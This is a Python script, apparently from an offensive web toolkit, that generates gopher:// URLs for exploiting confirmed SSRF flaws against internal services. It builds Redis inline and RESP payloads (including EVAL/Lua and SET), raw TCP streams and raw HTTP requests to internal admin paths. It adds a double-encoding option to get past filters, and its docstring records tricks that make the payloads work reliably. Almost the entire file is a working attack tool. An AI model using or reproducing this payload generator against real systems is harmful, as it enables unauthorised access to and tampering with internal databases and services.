#!/usr/bin/env python3
"""Build gopher:// URLs for confirmed-SSRF escalation to internal services.

Field notes carry two hard-won traps this tool encodes:
- the `_` selector prefix eats the first byte after host:port — every URL
  here starts the stream with `_` so the real payload survives intact;
- redis holds the connection open: without a trailing QUIT the fetcher
  hits its own timeout and reports 'failed', indistinguishable from
  "gopher unsupported". QUIT is appended unless --no-quit.
- RESP inline commands are fine for PING/INFO; for SET/EVAL/Lua use
  --resp arrays and the tool computes the $-length prefix for you —
  an off-by-one there is the second recorded failure.

  python3 tools/web/gopher_gen.py redis --host 127.0.0.1 --cmd PING
  python3 tools/web/gopher_gen.py redis --cmd "SET flag x" --cmd QUIT
  python3 tools/web/gopher_gen.py resp --args GET,mykey
  python3 tools/web/gopher_gen.py raw --text "GET / HTTP/1.0\r\n\r\n"
  python3 tools/web/gopher_gen.py http --path /admin --method POST --data 'a=b'
  python3 tools/web/gopher_gen.py --selftest
"""
import argparse, json, sys
from urllib.parse import quote_from_bytes


def gopher(host, port, stream):
    enc = quote_from_bytes(stream, safe="")
    return "gopher://%s:%d/_%s" % (host, port, enc)


def resp_array(args):
    out = b"*%d\r\n" % len(args)
    for a in args:
        b = a.encode() if isinstance(a, str) else a
        out += b"$%d\r\n%s\r\n" % (len(b), b)
    return out


def redis_stream(cmds, quit_=True):
    """Inline commands for simple ones; callers pass --resp for bulk."""
    s = b""
    for c in cmds:
        parts = c.split(" ", 1)
        if len(parts) == 1:
            s += parts[0].encode() + b"\r\n"
        else:
            s += c.encode() + b"\r\n"
    if quit_:
        s += b"QUIT\r\n"
    return s


def http_stream(method, path, host, headers, data):
    body = (data or "").encode()
    req = ("%s %s HTTP/1.1\r\nHost: %s\r\n" % (method, path, host)).encode()
    for h in headers or []:
        req += h.encode() + b"\r\n"
    if body:
        req += b"Content-Length: %d\r\n" % len(body)
    req += b"Connection: close\r\n\r\n" + body
    return req


def _selftest() -> int:
    u = gopher("127.0.0.1", 6379, redis_stream(["PING"]))
    assert u.startswith("gopher://127.0.0.1:6379/_"), u
    assert "PING%0D%0A" in u and "QUIT%0D%0A" in u, u
    assert "%2A" not in u.split("PING")[0]  # no stray RESP framing
    r = resp_array(["EVAL", "return 1", "0"])
    assert r == b"*3\r\n$4\r\nEVAL\r\n$8\r\nreturn 1\r\n$1\r\n0\r\n", r
    h = http_stream("POST", "/x", "h:1", ["A: b"], "d=1")
    assert h.startswith(b"POST /x HTTP/1.1\r\nHost: h:1\r\n"), h
    assert b"Content-Length: 3\r\n" in h and h.endswith(b"\r\n\r\nd=1"), h
    d = gopher("h", 1, b"A\r\nB")
    assert d == "gopher://h:1/_A%0D%0AB", d
    print("gopher_gen selftest: ok")
    return 0


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--selftest", action="store_true")
    sub = ap.add_subparsers(dest="mode")

    r = sub.add_parser("redis", help="inline redis commands")
    r.add_argument("--cmd", action="append", required=True)
    r.add_argument("--no-quit", action="store_true")

    p = sub.add_parser("resp", help="one RESP array (Lua, SET with spaces)")
    p.add_argument("--args", required=True,
                   help="comma-separated array elements")
    p.add_argument("--no-quit", action="store_true")

    t = sub.add_parser("raw", help="arbitrary stream")
    t.add_argument("--text", required=True,
                   help="payload; \\r\\n escapes honoured")

    h = sub.add_parser("http", help="raw HTTP request to an internal site")
    h.add_argument("--method", default="GET")
    h.add_argument("--path", default="/")
    h.add_argument("--header", action="append")
    h.add_argument("--data")

    for s in (r, p, t, h):
        s.add_argument("--host", default="127.0.0.1")
        s.add_argument("--port", type=int)
        s.add_argument("--double", action="store_true",
                       help="percent-encode twice (filters that decode once)")
    a = ap.parse_args()
    if a.selftest:
        return _selftest()
    if not a.mode:
        ap.error("a mode is required: redis | resp | raw | http")
    defaults = {"redis": 6379, "resp": 6379, "http": 80, "raw": 6379}
    port = a.port or defaults[a.mode]
    if a.mode == "redis":
        stream = redis_stream(a.cmd, not a.no_quit)
    elif a.mode == "resp":
        stream = resp_array(a.args.split(","))
        if not a.no_quit:
            stream += b"QUIT\r\n"
    elif a.mode == "http":
        stream = http_stream(a.method.upper(), a.path,
                             "%s:%d" % (a.host, port), a.header, a.data)
    else:
        stream = a.text.encode().decode("unicode_escape").encode("latin1")
    url = gopher(a.host, port, stream)
    if a.double:
        url = gopher(a.host, port, url.encode())
    print(json.dumps({
        "url": url, "bytes": len(stream),
        "stream_head": stream[:80].decode("latin1"),
        "quit_appended": a.mode in ("redis", "resp")
        and not getattr(a, "no_quit", False),
        "note": "verify the fetcher supports gopher first — ssrf_probe "
                "--ports or a PING round-trip"}, indent=1))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
